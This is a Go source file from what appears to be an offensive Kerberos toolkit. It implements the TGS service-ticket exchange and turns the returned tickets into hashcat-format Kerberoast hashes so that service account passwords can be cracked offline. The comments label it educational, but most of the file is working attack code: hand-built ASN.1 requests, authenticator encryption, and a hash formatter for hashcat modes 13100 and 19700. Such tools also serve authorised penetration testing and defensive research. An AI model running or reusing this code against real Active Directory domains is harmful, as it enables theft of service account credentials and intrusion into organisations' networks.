package client

import (
	"context"
	"encoding/asn1"
	"fmt"
	"strings"
	"time"

	"github.com/goobeus/goobeus/pkg/asn1krb5"
	"github.com/goobeus/goobeus/pkg/crypto"
	"github.com/goobeus/goobeus/pkg/ticket"
)

// EDUCATIONAL: TGS Exchange - Getting Service Tickets
//
// The TGS (Ticket Granting Service) exchange uses your TGT to get
// service tickets for specific services. This is Kerberos step 2.
//
// Flow:
//   1. Build TGS-REQ with:
//      - Target service (SPN)
//      - Your TGT (encrypted, in the request)
//      - Authenticator (proves you have the session key)
//   2. Send to KDC
//   3. Receive TGS-REP with:
//      - Service ticket (encrypted with service's key)
//      - New session key (for use with the service)
//
// Why this matters for attacks:
// - Kerberoasting: Request tickets for any SPN, crack offline
// - The service ticket is encrypted with the SERVICE's key
// - If they use RC4, that key is their NTLM hash!

// TGSRequest configures a service ticket request.
type TGSRequest struct {
	// The TGT to use (from AskTGT)
	TGT        *ticket.Kirbi
	SessionKey []byte // Session key for the TGT

	// Target service
	Service string // SPN like "cifs/server.domain.com" or "MSSQLSvc/sql01:1433"
	Domain  string // Target realm (usually same as TGT realm)

	// Options
	Etype int32 // Preferred etype for service ticket (0 = auto)

	// Connection
	KDC string // Explicit KDC (auto-discovered if empty)
}

// TGSResult contains the result of a service ticket request.
type TGSResult struct {
	*SessionInfo
	Kirbi  *ticket.Kirbi
	Base64 string

	// For Kerberoasting - raw encrypted ticket for cracking
	Hash string // Hashcat format
}

// AskTGS requests a service ticket using an existing TGT.
//
// EDUCATIONAL: Service Ticket Request
//
// This is also known as the TGS exchange:
//  1. We include our TGT in the request (PA-TGS-REQ padata)
//  2. We prove we have the TGT session key with an Authenticator
//  3. KDC validates TGT, issues service ticket
//
// For Kerberoasting:
//   - We request tickets for accounts with SPNs
//   - The ticket is encrypted with their password hash
//   - We extract and crack it offline
func AskTGS(req *TGSRequest) (*TGSResult, error) {
	return AskTGSWithContext(context.Background(), req)
}

// AskTGSWithContext requests a service ticket with context support.
func AskTGSWithContext(ctx context.Context, req *TGSRequest) (*TGSResult, error) {
	if req.TGT == nil || req.TGT.Ticket() == nil {
		return nil, fmt.Errorf("TGT is required")
	}
	if req.Service == "" {
		return nil, fmt.Errorf("service is required")
	}
	if len(req.SessionKey) == 0 {
		// Try to get from TGT
		if key := req.TGT.SessionKey(); key != nil {
			req.SessionKey = key.KeyValue
		} else {
			return nil, fmt.Errorf("session key is required")
		}
	}

	// Parse service name
	sname := parseServiceName(req.Service)
	fmt.Printf("[DEBUG] TGS-REQ sname: type=%d, name=%v\n", sname.NameType, sname.NameString)

	// Get domain from TGT or request
	domain := req.Domain
	if domain == "" && req.TGT.CredInfo != nil && len(req.TGT.CredInfo.TicketInfo) > 0 {
		domain = req.TGT.CredInfo.TicketInfo[0].SRealm
	}
	if domain == "" {
		return nil, fmt.Errorf("domain is required")
	}

	// Determine etype from session key
	etype := req.Etype
	if etype == 0 {
		etype = detectEtype(req.SessionKey)
	}

	// Create client
	client := NewClient(domain).WithKDC(req.KDC)

	// Get client name from TGT CredInfo for authenticator
	// The authenticator MUST include correct client name for KDC to accept
	var crealm string
	var cname asn1krb5.PrincipalName
	if req.TGT.CredInfo != nil && len(req.TGT.CredInfo.TicketInfo) > 0 {
		info := &req.TGT.CredInfo.TicketInfo[0]
		crealm = info.PRealm
		cname = info.PName
	}

	// Build authenticator and add PA-TGS-REQ
	paTGSReq, err := buildPATGSReqWithClientPName(req.TGT.Ticket(), req.SessionKey, etype, crealm, cname)
	if err != nil {
		return nil, fmt.Errorf("failed to build PA-TGS-REQ: %w", err)
	}

	// Build and marshal TGS-REQ with proper GeneralString encoding
	tgsReqBytes, err := buildTGSREQBytes(sname, domain, etype, []asn1krb5.PAData{paTGSReq})
	if err != nil {
		return nil, fmt.Errorf("failed to build TGS-REQ: %w", err)
	}

	respBytes, err := client.send(ctx, tgsReqBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to send TGS-REQ: %w", err)
	}

	// Check for error response
	if err := checkKRBError(respBytes); err != nil {
		return nil, err
	}

	// Parse TGS-REP manually to handle GeneralString encoding
	// Go's asn1.Unmarshal fails on GeneralString tags (0x1b)
	ticketBytes, encPartData, err := parseTGSREPManual(respBytes)
	if err != nil {
		return nil, fmt.Errorf("failed to parse TGS-REP: %w", err)
	}

	// Decrypt the enc-part to get session key
	// Key usage 8 for TGS-REP enc-part
	decrypted, err := decryptEncPartBytes(encPartData, req.SessionKey, etype, crypto.KeyUsageTGSRepSessionKey)
	if err != nil {
		return nil, fmt.Errorf("failed to decrypt TGS-REP enc-part: %w", err)
	}

	// Parse decrypted EncKDCRepPart manually
	encRepPart, err := parseEncKDCRepPartManual(decrypted)
	if err != nil {
		return nil, fmt.Errorf("failed to parse EncTGSRepPart: %w", err)
	}

	// Build Ticket struct from raw bytes
	tkt := asn1krb5.Ticket{RawBytes: ticketBytes}

	// Build kirbi from service ticket
	kirbi, err := buildKirbiFromTGSRaw(ticketBytes, encRepPart.Key)
	if err != nil {
		return nil, fmt.Errorf("failed to build kirbi: %w", err)
	}

	// Get base64
	b64, _ := kirbi.ToBase64()

	// Generate Kerberoast hash
	hash := generateKerberoastHash(&tkt, req.Service)

	return &TGSResult{
		SessionInfo: &SessionInfo{
			SessionKey:  encRepPart.Key,
			Ticket:      &tkt,
			Kirbi:       kirbi,
			AuthTime:    encRepPart.AuthTime,
			StartTime:   encRepPart.StartTime,
			EndTime:     encRepPart.EndTime,
			RenewTill:   encRepPart.RenewTill,
			ServerRealm: encRepPart.SRealm,
			ServerName:  encRepPart.SName,
		},
		Kirbi:  kirbi,
		Base64: b64,
		Hash:   hash,
	}, nil
}

// buildTGSREQBytes constructs a TGS-REQ message with proper GeneralString encoding.
// Returns raw bytes ready to send, plus the TGSREQ struct for reference.
// This is needed because Go's asn1.Marshal uses PrintableString which KDCs reject.
func buildTGSREQBytes(sname asn1krb5.PrincipalName, domain string, etype int32, padata []asn1krb5.PAData) ([]byte, error) {
	now := time.Now().UTC()

	// Helper functions
	buildLen := func(l int) []byte {
		if l < 128 {
			return []byte{byte(l)}
		} else if l < 256 {
			return []byte{0x81, byte(l)}
		}
		return []byte{0x82, byte(l >> 8), byte(l)}
	}

	wrapExplicit := func(tag int, data []byte) []byte {
		result := []byte{byte(0xa0 + tag)}
		result = append(result, buildLen(len(data))...)
		return append(result, data...)
	}

	wrapSeq := func(data []byte) []byte {
		result := []byte{0x30}
		result = append(result, buildLen(len(data))...)
		return append(result, data...)
	}

	wrapApp := func(tag int, data []byte) []byte {
		result := []byte{byte(0x60 + tag)}
		result = append(result, buildLen(len(data))...)
		return append(result, data...)
	}

	buildInt := func(n int32) []byte {
		if n >= 0 && n < 128 {
			return []byte{0x02, 0x01, byte(n)}
		} else if n >= 128 && n < 256 {
			return []byte{0x02, 0x02, 0x00, byte(n)}
		} else if n >= 256 && n < 32768 {
			return []byte{0x02, 0x02, byte(n >> 8), byte(n)}
		}
		return []byte{0x02, 0x04, byte(n >> 24), byte(n >> 16), byte(n >> 8), byte(n)}
	}

	buildGeneralString := func(s string) []byte {
		data := []byte(s)
		result := []byte{0x1b} // GeneralString tag
		result = append(result, buildLen(len(data))...)
		return append(result, data...)
	}

	// Build PrincipalName with GeneralString
	buildPrincipalName := func(nameType int32, names []string) []byte {
		// [0] name-type INTEGER
		nameTypeBytes := wrapExplicit(0, buildInt(nameType))

		// [1] name-string SEQUENCE OF GeneralString
		var nameContent []byte
		for _, name := range names {
			nameContent = append(nameContent, buildGeneralString(name)...)
		}
		nameString := wrapExplicit(1, wrapSeq(nameContent))

		return wrapSeq(append(nameTypeBytes, nameString...))
	}

	// Build KDC-REQ-BODY
	// [0] kdc-options
	options := asn1krb5.FlagForwardable | asn1krb5.FlagRenewable | asn1krb5.FlagProxiable
	optionsBits := []byte{byte(options >> 24), byte(options >> 16), byte(options >> 8), byte(options)}
	kdcOptions := wrapExplicit(0, append([]byte{0x03, 0x05, 0x00}, optionsBits...))

	// [2] realm GeneralString
	realm := wrapExplicit(2, buildGeneralString(strings.ToUpper(domain)))

	// [3] sname PrincipalName
	snameBytes := wrapExplicit(3, buildPrincipalName(sname.NameType, sname.NameString))

	// [5] till GeneralizedTime
	tillTime := now.Add(10 * time.Hour)
	tillStr := tillTime.Format("20060102150405") + "Z"
	till := wrapExplicit(5, append([]byte{0x18, byte(len(tillStr))}, []byte(tillStr)...))

	// [7] nonce INTEGER
	nonce := int32(now.UnixNano() & 0x7FFFFFFF)
	nonceBytes := wrapExplicit(7, buildInt(nonce))

	// [8] etype SEQUENCE OF INTEGER
	etypes := []int32{etype, crypto.EtypeAES256, crypto.EtypeAES128, crypto.EtypeRC4}
	var etypeContent []byte
	for _, et := range etypes {
		etypeContent = append(etypeContent, buildInt(et)...)
	}
	etypeSeq := wrapExplicit(8, wrapSeq(etypeContent))

	// Assemble req-body
	reqBodyContent := append(kdcOptions, realm...)
	reqBodyContent = append(reqBodyContent, snameBytes...)
	reqBodyContent = append(reqBodyContent, till...)
	reqBodyContent = append(reqBodyContent, nonceBytes...)
	reqBodyContent = append(reqBodyContent, etypeSeq...)
	reqBody := wrapSeq(reqBodyContent)

	// Build TGS-REQ
	// [1] pvno INTEGER
	pvno := wrapExplicit(1, buildInt(asn1krb5.PVNO))

	// [2] msg-type INTEGER
	msgType := wrapExplicit(2, buildInt(asn1krb5.MsgTypeTGSREQ))

	// [3] padata SEQUENCE OF PA-DATA
	var padataContent []byte
	for _, pa := range padata {
		// PA-DATA ::= SEQUENCE { [1] padata-type INTEGER, [2] padata-value OCTET STRING }
		paType := wrapExplicit(1, buildInt(pa.PADataType))
		paValue := wrapExplicit(2, append([]byte{0x04}, append(buildLen(len(pa.PADataValue)), pa.PADataValue...)...))
		padataContent = append(padataContent, wrapSeq(append(paType, paValue...))...)
	}
	padataSeq := wrapExplicit(3, wrapSeq(padataContent))

	// [4] req-body
	reqBodyWrapped := wrapExplicit(4, reqBody)

	// Assemble TGS-REQ SEQUENCE
	tgsReqContent := append(pvno, msgType...)
	tgsReqContent = append(tgsReqContent, padataSeq...)
	tgsReqContent = append(tgsReqContent, reqBodyWrapped...)

	// Wrap with APPLICATION 12
	return wrapApp(12, wrapSeq(tgsReqContent)), nil
}

// buildPATGSReq builds the PA-TGS-REQ padata with authenticator.
// The crealm and cname must match the client from the TGT.
func buildPATGSReq(tgt *asn1krb5.Ticket, sessionKey []byte, etype int32) (asn1krb5.PAData, error) {
	return buildPATGSReqWithClient(tgt, sessionKey, etype, nil)
}

// buildPATGSReqWithClientPName builds PA-TGS-REQ with explicit client PrincipalName (includes type).
func buildPATGSReqWithClientPName(tgt *asn1krb5.Ticket, sessionKey []byte, etype int32, crealm string, cname asn1krb5.PrincipalName) (asn1krb5.PAData, error) {
	// Build authenticator with full client PrincipalName (preserves name-type)
	auth, err := buildAuthenticatorWithPName(sessionKey, etype, crealm, cname)
	if err != nil {
		return asn1krb5.PAData{}, err
	}

	// Marshal TGT with APPLICATION 1 tag
	tgtBytes, err := tgt.Marshal()
	if err != nil {
		return asn1krb5.PAData{}, fmt.Errorf("failed to marshal TGT: %w", err)
	}

	// Manually wrap ticket with [3] explicit tag
	// IMPORTANT: When using RawValue{FullBytes}, Go's asn1.Marshal copies bytes as-is
	// WITHOUT applying struct tags! So we MUST manually add the [3] wrapper.
	wrapExplicitTag := func(tag int, data []byte) []byte {
		result := []byte{byte(0xa0 + tag)}
		if len(data) < 128 {
			result = append(result, byte(len(data)))
		} else if len(data) < 256 {
			result = append(result, 0x81, byte(len(data)))
		} else {
			result = append(result, 0x82, byte(len(data)>>8), byte(len(data)))
		}
		return append(result, data...)
	}
	tgtWrapped := wrapExplicitTag(3, tgtBytes)

	// Build AP-REQ
	apReq := asn1krb5.APREQRaw{
		PVNO:    asn1krb5.PVNO,
		MsgType: asn1krb5.MsgTypeAPREQ,
		APOptions: asn1.BitString{
			Bytes:     []byte{0, 0, 0, 0},
			BitLength: 32,
		},
		Ticket:        asn1.RawValue{FullBytes: tgtWrapped},
		Authenticator: auth,
	}

	innerSeq, err := asn1.Marshal(apReq)
	if err != nil {
		return asn1krb5.PAData{}, err
	}

	buildLen := func(l int) []byte {
		if l < 128 {
			return []byte{byte(l)}
		} else if l < 256 {
			return []byte{0x81, byte(l)}
		}
		return []byte{0x82, byte(l >> 8), byte(l)}
	}

	apReqBytes := []byte{0x6e}
	apReqBytes = append(apReqBytes, buildLen(len(innerSeq))...)
	apReqBytes = append(apReqBytes, innerSeq...)

	return asn1krb5.PAData{
		PADataType:  asn1krb5.PADataTGSReq,
		PADataValue: apReqBytes,
	}, nil
}

// buildPATGSReqWithClient builds PA-TGS-REQ with explicit client name.
func buildPATGSReqWithClient(tgt *asn1krb5.Ticket, sessionKey []byte, etype int32, cname []string) (asn1krb5.PAData, error) {
	// Get client info from TGT realm
	crealm := tgt.Realm

	// Build authenticator with client info
	auth, err := buildAuthenticatorWithClient(sessionKey, etype, crealm, cname)
	if err != nil {
		return asn1krb5.PAData{}, err
	}

	// Marshal TGT with APPLICATION 1 tag
	tgtBytes, err := tgt.Marshal()
	if err != nil {
		return asn1krb5.PAData{}, fmt.Errorf("failed to marshal TGT: %w", err)
	}

	// Manually wrap ticket with [3] explicit tag
	// Go's asn1.Marshal ignores struct tags when RawValue.FullBytes is set
	wrapExplicitTag := func(tag int, data []byte) []byte {
		result := []byte{byte(0xa0 + tag)}
		if len(data) < 128 {
			result = append(result, byte(len(data)))
		} else if len(data) < 256 {
			result = append(result, 0x81, byte(len(data)))
		} else {
			result = append(result, 0x82, byte(len(data)>>8), byte(len(data)))
		}
		return append(result, data...)
	}
	tgtWrapped := wrapExplicitTag(3, tgtBytes) // [3] Ticket

	// Build AP-REQ with wrapped Ticket bytes
	apReq := asn1krb5.APREQRaw{
		PVNO:    asn1krb5.PVNO,
		MsgType: asn1krb5.MsgTypeAPREQ,
		APOptions: asn1.BitString{
			Bytes:     []byte{0, 0, 0, 0},
			BitLength: 32,
		},
		Ticket:        asn1.RawValue{FullBytes: tgtWrapped},
		Authenticator: auth,
	}

	// First marshal to SEQUENCE (this gives us the inner SEQUENCE content)
	innerSeq, err := asn1.Marshal(apReq)
	if err != nil {
		return asn1krb5.PAData{}, err
	}

	// Now wrap with APPLICATION 14 tag manually
	// Per RFC 4120: AP-REQ ::= [APPLICATION 14] SEQUENCE {...}
	// Go's MarshalWithParams("application,tag:14") doesn't add the inner SEQUENCE
	buildLen := func(l int) []byte {
		if l < 128 {
			return []byte{byte(l)}
		} else if l < 256 {
			return []byte{0x81, byte(l)}
		}
		return []byte{0x82, byte(l >> 8), byte(l)}
	}

	apReqBytes := []byte{0x6e} // APPLICATION 14 tag
	apReqBytes = append(apReqBytes, buildLen(len(innerSeq))...)
	apReqBytes = append(apReqBytes, innerSeq...)

	return asn1krb5.PAData{
		PADataType:  asn1krb5.PADataTGSReq,
		PADataValue: apReqBytes,
	}, nil
}

// buildAuthenticator creates an encrypted authenticator (legacy, no client info).
func buildAuthenticator(sessionKey []byte, etype int32) (asn1krb5.EncryptedData, error) {
	return buildAuthenticatorWithClient(sessionKey, etype, "", nil)
}

// buildAuthenticatorWithPName creates an encrypted authenticator with full PrincipalName (preserves name-type).
func buildAuthenticatorWithPName(sessionKey []byte, etype int32, crealm string, cname asn1krb5.PrincipalName) (asn1krb5.EncryptedData, error) {
	now := time.Now().UTC()

	// Authenticator structure - uses the exact PrincipalName from TGT
	auth := asn1krb5.Authenticator{
		AuthenticatorVno: 5,
		CRealm:           crealm,
		CName:            cname, // Use full PrincipalName from TGT
		CTime:            now,
		CUsec:            int32(now.Nanosecond() / 1000),
	}

	// Use custom Marshal for proper GeneralString (0x1b) encoding
	authBytes, err := auth.Marshal()
	if err != nil {
		return asn1krb5.EncryptedData{}, err
	}

	// Debug: dump authenticator plaintext for comparison
	fmt.Printf("[DEBUG] Authenticator plaintext (%d bytes): %x\n", len(authBytes), authBytes)

	// Encrypt with key usage 7
	var encrypted []byte
	switch etype {
	case crypto.EtypeRC4:
		encrypted, err = crypto.EncryptRC4(sessionKey, authBytes, crypto.KeyUsageTGSReqPAData)
	case crypto.EtypeAES128, crypto.EtypeAES256:
		encrypted, err = crypto.EncryptAES(sessionKey, authBytes, crypto.KeyUsageTGSReqPAData, int(etype))
	default:
		return asn1krb5.EncryptedData{}, fmt.Errorf("unsupported etype: %d", etype)
	}
	if err != nil {
		return asn1krb5.EncryptedData{}, err
	}

	return asn1krb5.EncryptedData{
		EType:  etype,
		Cipher: encrypted,
	}, nil
}

// buildAuthenticatorWithClient creates an encrypted authenticator with client realm and name.
func buildAuthenticatorWithClient(sessionKey []byte, etype int32, crealm string, cname []string) (asn1krb5.EncryptedData, error) {
	now := time.Now().UTC()

	// Authenticator structure - crealm and cname are REQUIRED for TGS-REQ
	// The KDC validates these match the TGT's client principal
	auth := asn1krb5.Authenticator{
		AuthenticatorVno: 5,
		CRealm:           crealm,
		CName: asn1krb5.PrincipalName{
			NameType:   asn1krb5.NTPrincipal,
			NameString: cname, // Must be actual client name from TGT
		},
		CTime: now,
		CUsec: int32(now.Nanosecond() / 1000),
	}

	// Use custom Marshal for proper GeneralString (0x1b) encoding
	authBytes, err := auth.Marshal()
	if err != nil {
		return asn1krb5.EncryptedData{}, err
	}

	// Encrypt
	var encrypted []byte
	switch etype {
	case crypto.EtypeRC4:
		encrypted, err = crypto.EncryptRC4(sessionKey, authBytes, crypto.KeyUsageTGSReqPAData)
	case crypto.EtypeAES128, crypto.EtypeAES256:
		encrypted, err = crypto.EncryptAES(sessionKey, authBytes, crypto.KeyUsageTGSReqPAData, int(etype))
	default:
		return asn1krb5.EncryptedData{}, fmt.Errorf("unsupported etype: %d", etype)
	}
	if err != nil {
		return asn1krb5.EncryptedData{}, err
	}

	return asn1krb5.EncryptedData{
		EType:  etype,
		Cipher: encrypted,
	}, nil
}

// parseServiceName parses an SPN into a PrincipalName.
func parseServiceName(spn string) asn1krb5.PrincipalName {
	// SPN format: service/host or service/host:port
	parts := splitSPN(spn)
	return asn1krb5.PrincipalName{
		NameType:   asn1krb5.NTSrvInst,
		NameString: parts,
	}
}

// splitSPN splits an SPN into components.
func splitSPN(spn string) []string {
	// Handle "service/host" or "service/host:port"
	result := []string{}
	current := ""
	for _, c := range spn {
		if c == '/' && len(result) == 0 {
			result = append(result, current)
			current = ""
		} else {
			current += string(c)
		}
	}
	if current != "" {
		result = append(result, current)
	}
	return result
}

// detectEtype guesses etype from key length.
func detectEtype(key []byte) int32 {
	switch len(key) {
	case 16:
		return crypto.EtypeRC4 // Could also be AES128
	case 32:
		return crypto.EtypeAES256
	default:
		return crypto.EtypeRC4
	}
}

// buildKirbiFromTGS creates a Kirbi from a service ticket.
func buildKirbiFromTGS(tkt *asn1krb5.Ticket, encPart *asn1krb5.EncTGSRepPart) (*ticket.Kirbi, error) {
	credInfo := asn1krb5.EncKRBCredPart{
		TicketInfo: []asn1krb5.KRBCredInfo{
			{
				Key:       encPart.Key,
				PRealm:    encPart.SRealm,
				AuthTime:  encPart.AuthTime,
				StartTime: encPart.StartTime,
				EndTime:   encPart.EndTime,
				RenewTill: encPart.RenewTill,
				SRealm:    encPart.SRealm,
				SName:     encPart.SName,
			},
		},
	}

	credInfoBytes, err := asn1.MarshalWithParams(&credInfo, "application,tag:29")
	if err != nil {
		return nil, err
	}

	krbCred := &asn1krb5.KRBCred{
		PVNO:    asn1krb5.PVNO,
		MsgType: asn1krb5.MsgTypeKRBCred,
		Tickets: []asn1krb5.Ticket{*tkt},
		EncPart: asn1krb5.EncryptedData{
			EType:  0,
			Cipher: credInfoBytes,
		},
	}

	return &ticket.Kirbi{
		Cred:     krbCred,
		CredInfo: &credInfo,
	}, nil
}

// generateKerberoastHash creates a hashcat-format hash from a service ticket.
//
// EDUCATIONAL: Kerberoast Hash Format
//
// Hashcat format for Kerberos TGS tickets:
// - Mode 13100 (RC4): $krb5tgs$23$*user$realm$spn*$checksum$edata2
// - Mode 19700 (AES256): $krb5tgs$18$user$realm$checksum$edata2
//
// The hash contains the encrypted ticket data, which is encrypted with
// the service account's password-derived key.
func generateKerberoastHash(tkt *asn1krb5.Ticket, spn string) string {
	// Extract components
	etype := tkt.EncPart.EType
	cipher := tkt.EncPart.Cipher
	realm := tkt.Realm

	if len(cipher) < 16 {
		return ""
	}

	switch etype {
	case 23: // RC4
		// $krb5tgs$23$*user$realm$spn*$checksum$edata2
		checksum := fmt.Sprintf("%x", cipher[:16])
		edata2 := fmt.Sprintf("%x", cipher[16:])
		return fmt.Sprintf("$krb5tgs$23$*%s$%s$%s*$%s$%s",
			"user", realm, spn, checksum, edata2)
	case 17, 18: // AES
		// $krb5tgs$18$user$realm$checksum$edata2
		checksumLen := 12
		if len(cipher) <= checksumLen {
			return ""
		}
		checksum := fmt.Sprintf("%x", cipher[len(cipher)-checksumLen:])
		edata2 := fmt.Sprintf("%x", cipher[:len(cipher)-checksumLen])
		return fmt.Sprintf("$krb5tgs$%d$%s$%s$*%s*$%s$%s",
			etype, "user", realm, spn, checksum, edata2)
	}

	return ""
}
